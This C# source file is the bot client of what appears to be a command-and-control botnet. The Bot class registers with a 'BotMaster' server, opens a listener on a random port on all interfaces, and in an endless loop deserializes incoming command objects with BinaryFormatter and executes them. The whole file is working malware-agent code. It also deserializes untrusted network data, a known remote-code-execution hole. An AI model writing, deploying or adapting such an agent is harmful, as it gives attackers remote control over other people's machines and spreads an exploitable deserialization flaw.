using Common.Commands;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Runtime.Serialization.Formatters.Binary;
using System.Text;
using System.Threading.Tasks;

namespace CnC_Bot
{
    public class Bot
    {
        private int RandomCommandPort;
        private TcpListener CommandsListener;

        /// <summary>
        /// Make initial contact with the server notifying him there is a new active bot.
        /// In addition, send the server the random generated port in which he should pass commands on.
        /// </summary>
        /// <param name="serverIP">The server ip</param>
        /// <param name="serverPort">The server port</param>
        /// <returns>True on success ; False on failure</returns>
        private bool Connect(string serverIP, int serverPort)
        {
            try
            {
                // Connect to the server ip and port
                TcpClient initialClient = new TcpClient(serverIP, serverPort);
                
                // Generate random number from 3000 to 8000 to be the commands port
                Random rand = new Random();
                RandomCommandPort = rand.Next(3000, 8000);
                byte[] buff = Convert.FromBase64String(Convert.ToString(RandomCommandPort));

                // Send the generated port to the server and close the client
                initialClient.GetStream().Write(buff, 0, buff.Length);
                initialClient.Close();
            }
            catch (Exception ex)
            {
                Console.WriteLine("Failed to connect to BotMaster!{0}",ex.ToString());
                return false;
            }

            return true;
        }

        /// <summary>
        /// The method that initiate all.
        /// 1. Make first contact with server and send the listening port.
        /// 2. Wait for commands to come and execute them.
        /// </summary>
        /// <param name="serverIP">The server ip</param>
        /// <param name="serverPort">The server port</param>
        public void Start(string serverIP, int serverPort)
        {
            if (Connect(serverIP, serverPort))
            {
                Listen();
                while (true)
                {
                    Recv_Command();
                }
            }
        }

        /// <summary>
        /// Open tcplistener for incoming commands from server.
        /// </summary>
        private void Listen()
        {
            try
            {
                this.CommandsListener = new TcpListener(IPAddress.Any, RandomCommandPort);

                this.CommandsListener.Start();
            }
            catch (Exception ex)
            {
                Console.WriteLine("Failed to create listening socket on port {0}\n{1}", RandomCommandPort, ex.ToString());
            }
        }

        /// <summary>
        /// Receive new command from the server, parse and execute it.
        /// </summary>
        private void Recv_Command()
        {
            try
            {
                /* Get a new connection from the server */
                Socket serverCommandSocket = CommandsListener.AcceptSocket();

                byte[] commandData = new byte[1024];
                serverCommandSocket.Receive(commandData);

                BinaryFormatter formattor = new BinaryFormatter();
                MemoryStream ms = new MemoryStream(commandData);

                /* Retrieve the command object, execute it and return the result to the server */
                Command currentCommand = (Command)formattor.Deserialize(ms);
                currentCommand.Execute(serverCommandSocket);

                serverCommandSocket.Close();
            }
            catch (Exception ex)
            {
                Console.WriteLine("Error while getting and parsing new command.\n{0}", ex.ToString());
            }
        }
    }
}
